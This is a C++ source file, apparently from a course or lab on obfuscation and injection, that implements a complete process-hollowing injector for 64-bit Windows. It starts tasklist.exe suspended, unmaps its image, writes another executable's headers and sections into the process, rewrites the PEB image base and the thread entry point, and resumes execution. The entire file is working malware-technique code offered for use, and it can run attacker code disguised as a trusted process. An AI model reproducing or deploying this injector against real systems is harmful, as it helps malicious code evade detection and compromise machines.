/*
    Process Hollowing payload
    Source : Hugo Bitard Obscurcissement, injection, Shellcode
    https://github.com/m0n0ph1/Process-Hollowing/tree/master/sourcecode/ProcessHollowing
    https://github.com/NATsCodes/ProcessHollowing/blob/master/Process%20Hollowing.cpp
*/
#pragma once
#include <iostream>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

int main()
{
    const char* filename = "C:\\Windows\\System32\\tasklist.exe";
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Shellcode
    const char* evilfilename = "C:\\Windows\\System32\\cmd.exe";
    HANDLE hFile = CreateFileA(evilfilename, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
    if (!hFile) {
        std::cerr << "[x] Error: " << std::endl;
        return FALSE;
    }
    DWORD dwSize = GetFileSize(hFile, 0);
    PBYTE pEvilImage = new BYTE[dwSize];
    DWORD dwBytesRead = 0;
    ReadFile(hFile, pEvilImage, dwSize, &dwBytesRead, 0);
    CloseHandle(hFile);

    // Create a suspended process
    if (!CreateProcessA(filename, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "[x] Error: " << GetLastError() << std::endl;
        return FALSE;
    }
    std::cerr << "[+] Successfuly created suspended process. " << std::endl;

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    // Get suspended process context
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[x] Error: " << GetLastError() << std::endl;
        return FALSE;
    }
    std::cerr << "[+] Successfuly retreived process context . " << std::endl;
    // Load NtQueryInformationProcess from ntdll.dll
    HMODULE hNTDLL = LoadLibraryA("ntdll");
    if (!hNTDLL) {
        std::cerr << "[x] Error: " << GetLastError() << std::endl;
        return FALSE;
    }
    _NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNTDLL, "NtQueryInformationProcess");
    if (!ntQueryInformationProcess) {
        std::cerr << "[x] Error: " << GetLastError() << std::endl;
        FreeLibrary(hNTDLL);
        return FALSE;
    }

    // Get PEB address
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pi.dwProcessId);
    if (!hProcess) {
        std::cerr << "[x] Error: Unable to open the target process." << std::endl;
        FreeLibrary(hNTDLL);
        return FALSE;
    }
    std::cerr << "[+] Successfuly opened process . "  << std::endl;

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    DWORD dwReturnLength = 0;
    NTSTATUS status = ntQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &dwReturnLength);
    if (status != 0) { // 0 = STATUS_SUCCESS
        std::cerr << "[x] Error: Unable to get process basic information." << std::endl;
        CloseHandle(hProcess);
        FreeLibrary(hNTDLL);
        return FALSE;
    }
    std::cout << "[+] Successfully found PEB Section Address." << std::endl;
    std::cout << "[INFO] PEB Address : " << pbi.PebBaseAddress << std::endl;

    // Read PEB and extract base address
    PEB pPeb;
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, (LPCVOID)pbi.PebBaseAddress, &pPeb, sizeof(pPeb), &bytesRead)) {
        std::cerr << "[x] Error: Unable to read PEB." << std::endl;
        CloseHandle(hProcess);
        FreeLibrary(hNTDLL);
        return FALSE;
    }
    std::cout << "[+] Successfully Read process memory. " << std::endl;

    // Read ImageBaseAddress from the context
    PVOID imageBaseAddress = 0;
    DWORD64 pebImageBaseOffset = ctx.Rdx + 0x10; //same as get the PEB section address and add 0x10
    if (!ReadProcessMemory(hProcess, (LPCVOID)pebImageBaseOffset, &imageBaseAddress, sizeof(PVOID), NULL)) {
        std::cerr << "[x] Error: Unable to read ImageBaseAddress from PEB. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return FALSE;
    }
    std::cout << "[+] Successfully retreived Image Base Address in PEB section: " << std::endl;
    std::cout << "[INFO] ImageBaseAddress: " << std::hex << imageBaseAddress << std::dec << std::endl;

    // Unmap original image
    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection(pi.hProcess, imageBaseAddress) != 0) {
        std::cerr << "[x] Error: NtUnmapViewOfSection failed." << std::endl;
        return FALSE;
    }
    std::cout << "[+] Memory unmapped successfully." << std::endl;

    // Extract headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pEvilImage;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pEvilImage + pDosHeader->e_lfanew);
    std::cout << "[+] Successfully extracted DOS header & NT headers. " << std::endl;
    std::cout << "[INFO] Image base source : " << pNtHeaders->OptionalHeader.ImageBase << std::endl;
    std::cout << "[INFO] Image base destination :  " << PVOID(imageBaseAddress) << std::endl;

    // Allocate memory in the target process
    PVOID pRemoteImage = VirtualAllocEx(pi.hProcess, imageBaseAddress, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteImage) {
        std::cerr << "[x] VirtualAllocEx failure : " << GetLastError() << std::endl;
        return FALSE;
    }
    std::cout << "[+] Successfully allocated memory in target process: " << std::endl;

    // Write headers to target process
    if (!WriteProcessMemory(pi.hProcess, pRemoteImage, pEvilImage, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        std::cerr << "[x] Headers write failure : " << GetLastError() << std::endl;
        return FALSE;
    }
    std::cout << "[+] Successfully copied headers in target process memory." << std::endl;

    // Write sections of evil process to target process memory
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pEvilImage + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        PVOID pSectionDestination = (PVOID)((LPBYTE)pRemoteImage + pSectionHeader->VirtualAddress);
        PVOID pSectionSource = (PVOID)(pEvilImage + pSectionHeader->PointerToRawData);

        // Write section i in memory
        if (!WriteProcessMemory(pi.hProcess, pSectionDestination, pSectionSource, pSectionHeader->SizeOfRawData, NULL)) {
            std::cerr << "[x] Failure : " << pSectionHeader->Name << std::endl;
            return FALSE;
        }
        std::cout << "  [INFO] Succcessfuly copied section " << pSectionHeader->Name << std::endl;
    }
    std::cout << "[+]Successfuly copied all evil process sections in target process memory." << std::endl;

    // Update ImageBaseAddress in the PEB
    if (!WriteProcessMemory(pi.hProcess, (LPVOID)pebImageBaseOffset, &pRemoteImage, sizeof(PVOID), NULL)) {
        std::cerr << "[x] Error updating PEB: " << GetLastError() << std::endl;
        return FALSE;
    }

    // Set the new entry point in the thread context (RCX for 64-bit)
    DWORD64 newEntryPoint = (DWORD64)((LPBYTE)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    ctx.Rcx = newEntryPoint;
    std::cout << "[INFO] pRemoteImage: " << std::hex << pRemoteImage << std::dec << std::endl;
    std::cout << "[INFO] AddressOfEntryPoint: " << pNtHeaders->OptionalHeader.AddressOfEntryPoint << std::endl;
    std::cout << "[INFO] newEntryPoint: " << newEntryPoint << std::endl;


    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[x] Error updating thread context: " << GetLastError() << std::endl;
        return FALSE;
    }
    std::cout << "[+] Successfully updated base address in the PEB & context." << std::endl;
    // Resume thread and wait for process to complete
    DWORD suspendCount = ResumeThread(pi.hThread);
    if (suspendCount == (DWORD)-1) {
        std::cerr << "[x] Error resuming thread: " << GetLastError() << std::endl;
        return FALSE;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    FreeLibrary(hNTDLL);
    delete[] pEvilImage;

    return TRUE;
}



